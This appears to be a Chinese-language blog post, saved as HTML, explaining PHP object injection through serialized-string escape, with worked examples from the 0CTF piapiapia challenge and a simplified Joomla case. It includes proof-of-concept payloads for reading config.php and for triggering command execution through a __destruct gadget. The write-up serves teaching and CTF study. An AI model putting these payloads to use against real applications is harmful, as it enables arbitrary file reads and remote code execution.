@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        php字符串逃逸导致的对象注入 - Monitor&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> Never be afraid to try and fail. </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            <i>monitor</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>About</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因"><span class="toc-text">漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php特性"><span class="toc-text">php特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example"><span class="toc-text">example</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0CTF-piapiapia"><span class="toc-text">0CTF piapiapia</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Joomla逃逸"><span class="toc-text">Joomla逃逸</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+        <div class="index-about-mobile">
+            <i> Never be afraid to try and fail. </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        php字符串逃逸导致的对象注入
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2020-02-05 15:25:09</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#php" title="php">php</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content ">
+        <h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><h3 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> $name=<span class="string">'james'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="string">'O:4:"Test":2:&#123;s:4:"name";s:5:"james";s:3:"age";s:2:"20";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($a));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  output:</span></span><br><span class="line"><span class="comment">object(Test)#1 (2) &#123;</span></span><br><span class="line"><span class="comment">  ["name"]=&gt;</span></span><br><span class="line"><span class="comment">  string(5) "james"</span></span><br><span class="line"><span class="comment">  ["age"]=&gt;</span></span><br><span class="line"><span class="comment">  string(2) "20"</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>php反序列化的时候，会对类中不存在的属性进行反序列化</li>
+<li>在反序列化的时候，以<code>;</code>分隔，<code>}</code>结尾，并且判断长度与内容是否合适</li>
+</ul>
+<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>由于序列化后的字符串，经过过滤函数不正确的处理导致的对象注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">      $a = preg_replace(<span class="string">"/x/"</span>,<span class="string">"bb"</span>,$string);</span><br><span class="line">      <span class="keyword">return</span> $a;</span><br><span class="line">&#125;</span><br><span class="line">$user = <span class="string">'monitor'</span>;</span><br><span class="line">$pass = <span class="string">"test1230x"</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>($user,$pass);</span><br><span class="line"><span class="keyword">echo</span> serialize($arr);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$c = safe(serialize($arr));</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"></span><br><span class="line">var_dump(unserialize($c));</span><br><span class="line"></span><br><span class="line">$us = <span class="string">'monitorxxxxxxxxxxxxxxxxxxxxx";i:1;s:7:"monitor";&#125;'</span>;</span><br><span class="line">$pass = <span class="string">"test1230"</span>;</span><br><span class="line">$a = <span class="keyword">array</span>($us,$pass);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$b = safe(serialize($a));</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">var_dump(unserialize($b));</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/05/object-injection-caused-by-PHP-string-escape/2.png" alt="2"></p>
+<p>可以看到，序列化后的字符串，经过过滤函数的处理，会将<code>x</code>替换成<code>bb</code>，看到经过过滤函数之后的字符串：<code>a:2:{i:0;s:7:&quot;monitor&quot;;i:1;s:9:&quot;test1230bb&quot;;}</code>，<code>test1230bb</code>实际长度是10，但是输出结果还是原先的9。并且，php在反序列化时候，只要字符串块合法就可以，显然，第一个反序列化长度为10，结果为9，抛出错误。</p>
+<p>因此，我们输入一个 <code>x</code>可以逃逸出一个空位，那么如果我想改变<code>pass</code>的属性：<code>&quot;;i:1;s:7:&quot;monitor&quot;;}</code>需要20个字符，那么输入20个x就可以注入成功，改变<code>pass</code>的属性值。</p>
+<h2 id="0CTF-piapiapia"><a href="#0CTF-piapiapia" class="headerlink" title="0CTF piapiapia"></a>0CTF piapiapia</h2><p>漏洞点：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...<span class="comment">//update.php</span></span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">		<span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">		$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">		$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">	&#125;</span><br><span class="line">...<span class="comment">//profile.php</span></span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure>
+<p>提供一个用户信息修改的地方，代码处理时会先序列化，再经过安全函数的处理会导致字符串逃逸，可以修改对象的属性值，配合<code>file_get_contents</code>可以读取任意文件内容。</p>
+<p><code>poc:nikename[]=where*34&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>，这里一个where可以逃逸出一个空字符</p>
+<h2 id="Joomla逃逸"><a href="#Joomla逃逸" class="headerlink" title="Joomla逃逸"></a>Joomla逃逸</h2><p>这里用的是网上别人的写的简易版，来看看漏洞成因</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username, $password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    $data = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">    file_put_contents(<span class="string">"dbs.txt"</span>, $data);</span><br><span class="line">    <span class="keyword">echo</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data = file_get_contents(<span class="string">"dbs.txt"</span>);</span><br><span class="line">    $r = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $data);</span><br><span class="line">    <span class="keyword">return</span> $r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>漏洞点在<code>str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $data)</code>，因为joomla会将数据存储到mysql数据库中，<code>protected</code>变量序列化之后会有<code>\x00*\x00</code>，那么mysql数据库不能存储空字符，所以在写入数据库之前经过替换，会将三个字符替换成六个字符，在反序列化时，会在读取的处理回来，这就导致存在逃逸。</p>
+<p>先看下替换后的序列化字符串：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"User"</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;s:<span class="number">60</span>:<span class="string">"m4ng00\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">54</span>:<span class="string">"1234"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>在替换后，长度是60，当从数据库提取出来时：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"User"</span>:<span class="number">2</span>：&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;s:<span class="number">60</span>:<span class="string">"m4ng00NNNNNNNNNNNNNNNNNNNNNNNNNNN"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">54</span>:<span class="string">"1234"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看见，替换回来之后，少了27个字符，那么就可以通过这样对象注入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"User"</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;s:<span class="number">60</span>:<span class="string">"m4ng00\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">54</span>:<span class="string">"1234"</span>;s:<span class="number">2</span>:<span class="string">"ts"</span>;O:<span class="number">4</span>:<span class="string">"evil"</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">"cmd"</span>;s:<span class="number">6</span>:<span class="string">"whoami"</span>;&#125;&#125;<span class="string">";&#125;</span></span><br><span class="line"><span class="string">//poc</span></span><br><span class="line"><span class="string">$username = "</span>m4ng00\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span><span class="string">";</span></span><br><span class="line"><span class="string">$payload = 's:2:"</span>ts<span class="string">";O:4:"</span>evil<span class="string">":1:&#123;s:3:"</span>cmd<span class="string">";s:6:"</span>whoami<span class="string">";&#125;';</span></span><br><span class="line"><span class="string">$password = '1234"</span>;<span class="string">'.$payload."&#125;";</span></span><br><span class="line"><span class="string">write(serialize(new User($username, $password)));</span></span><br><span class="line"><span class="string">var_dump(unserialize(read()));</span></span><br></pre></td></tr></table></figure>
+<p>我们需要将扩增的27个字符覆盖掉password字段，即<code>s:8:&quot;password&quot;;s:54:&quot;1234&quot;;</code>长度为27，正好覆盖，将payload作为password插入进去，这样在反序列化的时候就会触发<code>evil</code>执行命令<img src="/2020/02/05/object-injection-caused-by-PHP-string-escape/3.png" alt="3"></p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <a href="http://m0nit0r.top">Monitor's Blog</a> && Theme by Aircloud</p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
